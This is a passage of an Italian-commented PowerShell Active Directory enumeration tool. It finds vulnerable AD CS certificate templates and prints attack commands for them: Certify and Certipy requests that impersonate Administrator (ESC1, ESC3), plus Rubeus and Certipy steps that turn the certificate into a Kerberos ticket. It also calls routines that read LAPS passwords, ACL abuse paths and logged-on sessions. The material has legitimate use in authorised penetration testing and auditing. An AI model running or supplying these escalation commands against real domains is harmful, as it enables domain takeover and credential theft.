                    EnrolleeSuppliesSAN = $enrolleeSuppliesSAN
                    HasClientAuth = $hasClientAuth
                    ManagerApproval = (-not $noManagerApproval)
                    AuthorizedSignatures = $raSignature
                    EKU = $eku
                }
            }
        }
    }
    catch {
        Write-Warning "Errore analisi AD CS: $_"
        Write-Info "AD CS potrebbe non essere installato"
        return
    }
    
    # Output risultati
    if ($vulnerableTemplates.Count -gt 0) {
        Write-Section "CERTIFICATE TEMPLATES VULNERABILI! ($($vulnerableTemplates.Count))"
        
        foreach ($t in $vulnerableTemplates) {
            Write-Warning "$($t.Name) - $($t.Vulnerabilities -join ', ')"
            
            foreach ($detail in $t.Details) {
                Write-Finding "Dettaglio" $detail -Important
            }
            
            if ($t.EnrolleeSuppliesSubject) {
                Write-Finding "ENROLLEE_SUPPLIES_SUBJECT" "ENABLED (può specificare qualsiasi utente)" -Important
            }
            if ($t.EnrolleeSuppliesSAN) {
                Write-Finding "ENROLLEE_SUPPLIES_SAN" "ENABLED (può specificare SAN arbitrario)" -Important
            }
            if (-not $t.ManagerApproval) {
                Write-Finding "Manager Approval" "NON RICHIESTO"
            }
            if ($t.AuthorizedSignatures -eq 0) {
                Write-Finding "Authorized Signatures" "NON RICHIESTE"
            }
            Write-Both ""
        }
        
        Write-Section "ATTACCHI AD CS"
        
        # ESC1 Attack
        $esc1Templates = $vulnerableTemplates | Where-Object { $_.Vulnerabilities -contains "ESC1" }
        if ($esc1Templates) {
            Write-Warning "ESC1 - Richiedi certificato come qualsiasi utente:"
            Write-Both ""
            Write-Both "        # Certify - trova CA e richiedi cert come Domain Admin" -Color Yellow
            Write-Both "        Certify.exe find /vulnerable" -Color Gray
            Write-Both "        Certify.exe request /ca:CA-SERVER\CA-NAME /template:$($esc1Templates[0].Name) /altname:Administrator" -Color Gray
            Write-Both ""
            Write-Both "        # Certipy (da Kali)" -Color Yellow
            Write-Both "        certipy req -u user@domain -p 'password' -ca CA-NAME -target ca-server -template $($esc1Templates[0].Name) -upn Administrator@domain" -Color Gray
            Write-Both ""
        }

        # ESC3 Attack
        if ($enrollmentAgentTemplates.Count -gt 0) {
            Write-Warning "ESC3 - Certificate Request Agent disponibile:"
            Write-Both ""
            Write-Both "        # Step 1: Ottieni Enrollment Agent certificate" -Color Yellow
            Write-Both "        Certify.exe request /ca:CA-SERVER\CA-NAME /template:$($enrollmentAgentTemplates[0])" -Color Gray
            Write-Both ""
            Write-Both "        # Step 2: Usa l'agent cert per richiedere cert per altri utenti" -Color Yellow
            Write-Both "        Certify.exe request /ca:CA-SERVER\CA-NAME /template:User /onbehalfof:DOMAIN\Administrator /enrollcert:agent.pfx" -Color Gray
            Write-Both ""
        }

        Write-Section "POST-EXPLOITATION CON CERTIFICATO"
        Write-Both "        # Converti PEM a PFX" -Color Yellow
        Write-Both "        openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx" -Color Gray
        Write-Both ""
        Write-Both "        # Rubeus - ottieni TGT con il certificato" -Color Yellow
        Write-Both "        Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt" -Color Gray
        Write-Both ""
        Write-Both "        # Certipy - autenticazione diretta" -Color Yellow
        Write-Both "        certipy auth -pfx administrator.pfx -dc-ip DC_IP" -Color Gray
        
    } else {
        Write-Info "Nessun template vulnerabile trovato (ESC1-ESC3)"
    }
    
    # Nota su ESC4-ESC8
    Write-Section "NOTE SU ALTRE VULNERABILITÀ ESC"
    Write-Info "ESC4: Permessi di scrittura su template -> Controlla Get-ACLAbuse per CertTemplate"
    Write-Info "ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 su CA -> certipy find -vulnerable"
    Write-Info "ESC7: Manage CA permission -> certipy find -vulnerable"
    Write-Info "ESC8: HTTP enrollment endpoint -> certipy find -vulnerable"
    Write-Both ""
    Write-Both "        # Analisi completa con Certipy" -Color Yellow
    Write-Both "        certipy find -u user@domain -p 'password' -dc-ip DC_IP -vulnerable" -Color Gray
}

#region Main Function

function Invoke-ADEnum {
    param(
        [switch]$Quick,
        [switch]$Full,
        [switch]$Sessions,
        [string]$OutputFile
    )

    # Inizializza output file se specificato
    if ($OutputFile) {
        $script:OutputFile = $OutputFile
        Set-Content -Path $OutputFile -Value "# AD-Enum Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        Add-Content -Path $OutputFile -Value "# User: $env:USERDOMAIN\$env:USERNAME"
        Add-Content -Path $OutputFile -Value ""
    }

    $startTime = Get-Date

    Write-Both "[*] Avvio enumerazione: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Color Green
    Write-Both "[*] Utente corrente: $env:USERDOMAIN\$env:USERNAME" -Color Green
    Write-Both ""

    # Enumerazione base
    Get-DomainInfo
    Get-PasswordPolicy
    Get-DomainUsers
    Get-SPNs
    Get-DomainGroups
    Get-DomainComputers
    Get-OrganizationalUnits

    if ($Full -or $Sessions) {
        Get-GPOs
        Get-GPOLinks
        Get-DomainShares
        Get-ACLAbuse
        Get-LAPSPasswords
        Get-DelegationInfo
        Get-ADCSVulnerabilities
        Get-LocalAdminAccess
        Get-DomainLoggedOnUsers
        Get-DomainSessionsWMI
        Get-DCOMAccess
        Get-RemoteAccessPermissions
    }

    # Riepilogo finale
    $endTime = Get-Date
    $duration = $endTime - $startTime

    Write-Both ""
    Write-Both "[*] Completato in: $($duration.TotalSeconds.ToString('0.00')) secondi" -Color Green

    # Cleanup
    if ($script:OutputFile) {
        Add-Content -Path $script:OutputFile -Value ""
        Add-Content -Path $script:OutputFile -Value "# Completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }
    $script:OutputFile = $null
}

#endregion
